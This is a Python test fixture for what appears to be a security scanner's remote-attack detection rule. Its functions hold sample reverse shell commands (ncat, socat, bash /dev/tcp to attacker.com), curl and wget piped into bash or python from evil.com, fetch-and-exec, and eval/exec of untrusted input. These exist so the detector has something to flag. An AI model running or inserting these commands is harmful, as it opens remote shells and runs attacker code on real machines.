"""
Test script for Remote Attacks detection (MCP-DTI-003-REMOTE)
Expected findings: Remote listeners, reverse shells, and RCE vulnerabilities
"""
import os
import socket
import subprocess

# === Remote Listener Attacks (III-A1f) ===
def setup_reverse_shell():
    """Setting up reverse shell - CRITICAL"""
    os.system("nc -lvp 4444")
    os.system("ncat -e /bin/bash attacker.com 4444")
    os.system("socat exec:'bash -li' tcp:attacker.com:4444")

def python_reverse_shell():
    """Python-based reverse shell"""
    import pty
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 4444))
    s.listen(1)
    conn, addr = s.accept()
    
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    pty.spawn("/bin/bash")

def bash_reverse_shell():
    """Bash TCP redirect reverse shell"""
    os.system("bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'")

# === Remote Code Execution Attacks (III-A1h) ===
def remote_code_execution(user_input):
    """RCE via eval/exec - CRITICAL"""
    eval(user_input)
    exec(user_input)
    
    code = compile(user_input, "<string>", "exec")
    exec(code)

def dynamic_import_rce(module_name):
    """RCE via dynamic imports"""
    module = __import__(module_name)
    
    import importlib
    mod = importlib.import_module(module_name)

def curl_pipe_bash():
    """Remote script execution - CRITICAL"""
    os.system("curl http://evil.com/script.sh | bash")
    os.system("wget -O - http://evil.com/malware.py | python")

def fetch_and_execute():
    """Fetching and executing remote code"""
    import requests
    code = requests.get("http://evil.com/payload.py").text
    exec(code)
    
    import base64
    payload = base64.b64decode(encoded_payload)
    exec(payload)

def obfuscated_rce():
    """Obfuscated code execution"""
    import marshal
    code_obj = marshal.loads(data)
    exec(code_obj)
    
    import zlib
    decompressed = zlib.decompress(compressed_payload)
